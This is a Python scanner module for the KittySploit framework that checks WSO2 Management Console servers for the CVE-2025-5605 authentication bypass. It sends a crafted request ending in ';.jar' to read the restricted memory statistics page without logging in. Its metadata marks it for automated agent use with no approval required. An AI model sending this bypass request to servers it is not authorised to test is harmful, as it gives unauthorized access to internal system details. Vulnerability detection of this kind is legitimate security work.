#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An authentication bypass vulnerability exists in the Management Console of multiple WSO2 products."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WSO2 Management Console - Authentication Bypass Detection',
        'description': 'An authentication bypass vulnerability exists in the Management Console of multiple WSO2 products. A malicious actor with access to the console can manipulate the request URI to bypass authentication and access certain restricted resources, resulting in partial information disclosure. The known exposure from this issue is limited to memory statistics. While the vulnerability does not allow full account compromise, it still enables unauthorized access to internal system details.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wso2', 'auth-bypass', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://blog.lexfo.fr/wso2.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-5605',
            'https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2025/WSO2-2025-4115/',
        ],
        'cve': 'CVE-2025-5605',
    }

    def run(self):
        path = '/carbon/server-admin/memory_info.jsp;.jar'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Memory Statistics', 'Collection Usage',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='WSO2 Management Console - Authentication Bypass detected', path=path)
            return True
        return False

